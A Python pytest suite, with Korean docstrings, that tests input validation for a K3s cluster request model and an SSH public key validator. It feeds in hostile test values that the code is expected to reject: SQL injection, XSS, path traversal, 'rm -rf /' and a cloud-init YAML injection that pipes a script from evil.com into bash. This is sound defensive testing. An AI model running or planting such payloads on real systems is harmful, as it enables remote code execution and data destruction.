"""입력 검증 보안 테스트 — 경계값, 특수문자, 초대형 입력."""

import pytest
from pydantic import ValidationError

from app.models.k3s import CreateK3sClusterRequest
from app.services.k3s_cloudinit import _validate_ssh_public_key


class TestK3sClusterNameValidation:
    def test_valid_name(self):
        """일반적인 유효 클러스터 이름은 허용되어야 한다."""
        req = CreateK3sClusterRequest(name="my-cluster")
        assert req.name == "my-cluster"

    def test_name_with_numbers(self):
        req = CreateK3sClusterRequest(name="cluster123")
        assert req.name == "cluster123"

    def test_name_too_short_single_char(self):
        """단일 문자 이름은 유효해야 한다 (최소 1자)."""
        req = CreateK3sClusterRequest(name="a")
        assert req.name == "a"

    def test_name_too_long_rejected(self):
        """63자 초과 이름은 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="a" * 64)

    def test_name_at_max_length(self):
        """63자 이름은 허용되어야 한다."""
        req = CreateK3sClusterRequest(name="a" * 63)
        assert len(req.name) == 63

    def test_name_with_special_chars_rejected(self):
        """특수문자를 포함한 이름은 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="cluster<script>")

    def test_name_with_sql_injection_rejected(self):
        """SQL injection 문자열은 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="'; DROP TABLE--")

    def test_name_with_newline_rejected(self):
        """개행문자 포함 이름은 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="cluster\nmalicious")

    def test_name_with_null_byte_rejected(self):
        """null byte 포함 이름은 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="cluster\x00inject")

    def test_name_starting_with_hyphen_rejected(self):
        """하이픈으로 시작하는 이름은 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="-bad")

    def test_name_with_spaces_rejected(self):
        """공백 포함 이름은 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="my cluster")

    def test_empty_name_auto_generates(self):
        """빈 이름은 자동으로 k3s-<uuid> 형식으로 생성되어야 한다."""
        req = CreateK3sClusterRequest(name="")
        assert req.name.startswith("k3s-")
        assert len(req.name) > 4

    def test_xss_payload_rejected(self):
        """XSS 페이로드는 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name='<img src=x onerror="alert(1)">')

    def test_path_traversal_rejected(self):
        """경로 순회 시도는 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="../../etc/passwd")

    def test_unicode_special_chars_rejected(self):
        """ASCII 범위 밖 유니코드는 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="클러스터")


class TestK3sAgentCountValidation:
    def test_valid_agent_count_zero(self):
        req = CreateK3sClusterRequest(name="test", agent_count=0)
        assert req.agent_count == 0

    def test_valid_agent_count_max(self):
        req = CreateK3sClusterRequest(name="test", agent_count=10)
        assert req.agent_count == 10

    def test_negative_agent_count_rejected(self):
        """음수 에이전트 수는 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="test", agent_count=-1)

    def test_agent_count_over_max_rejected(self):
        """최대값(10) 초과는 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="test", agent_count=11)

    def test_very_large_agent_count_rejected(self):
        """매우 큰 정수도 거부되어야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="test", agent_count=999999)


class TestK3sOsTypeValidation:
    def test_valid_ubuntu(self):
        req = CreateK3sClusterRequest(name="test", os_type="ubuntu")
        assert req.os_type == "ubuntu"

    def test_valid_fcos(self):
        req = CreateK3sClusterRequest(name="test", os_type="fcos")
        assert req.os_type == "fcos"

    def test_invalid_os_type_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="test", os_type="windows")

    def test_case_sensitive_os_type(self):
        """os_type 검증은 대소문자를 구별해야 한다."""
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="test", os_type="Ubuntu")

    def test_os_type_injection_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sClusterRequest(name="test", os_type="; rm -rf /")


class TestSshPublicKeyValidation:
    def test_valid_ed25519_key(self):
        """유효한 ed25519 키는 통과해야 한다."""
        key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest user@host"
        _validate_ssh_public_key(key)  # 예외 없어야 함

    def test_valid_rsa_key(self):
        """유효한 RSA 키는 통과해야 한다."""
        key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC7test test@host"
        _validate_ssh_public_key(key)

    def test_valid_ecdsa_key(self):
        """유효한 ECDSA 키는 통과해야 한다."""
        key = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYtest test@host"
        _validate_ssh_public_key(key)

    def test_newline_injection_rejected(self):
        """개행 문자 포함 SSH 키는 거부되어야 한다."""
        key = "ssh-ed25519 AAAA\nwrite_files:\n  - content: malicious"
        with pytest.raises(ValueError, match="개행"):
            _validate_ssh_public_key(key)

    def test_carriage_return_injection_rejected(self):
        """캐리지 리턴 포함 SSH 키는 거부되어야 한다."""
        key = "ssh-ed25519 AAAA\rmalicious"
        with pytest.raises(ValueError):
            _validate_ssh_public_key(key)

    def test_invalid_key_type_rejected(self):
        """지원하지 않는 키 타입은 거부되어야 한다."""
        with pytest.raises(ValueError, match="유효하지 않은"):
            _validate_ssh_public_key("dss AAAAB3NzaC test@host")

    def test_arbitrary_string_rejected(self):
        """임의 문자열은 거부되어야 한다."""
        with pytest.raises(ValueError):
            _validate_ssh_public_key("not-a-key")

    def test_empty_key_rejected(self):
        """빈 문자열은 거부되어야 한다."""
        with pytest.raises(ValueError):
            _validate_ssh_public_key("")

    def test_yaml_injection_payload_rejected(self):
        """YAML injection 페이로드는 거부되어야 한다."""
        key = "ssh-ed25519 AAAA\nruncmd:\n  - curl http://evil.com | bash"
        with pytest.raises(ValueError):
            _validate_ssh_public_key(key)

    def test_multi_word_comment_accepted(self):
        """코멘트 필드에 공백이 포함된 키도 통과해야 한다 (예: 'termius by jung')."""
        key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest termius by jung"
        _validate_ssh_public_key(key)  # 예외 없어야 함
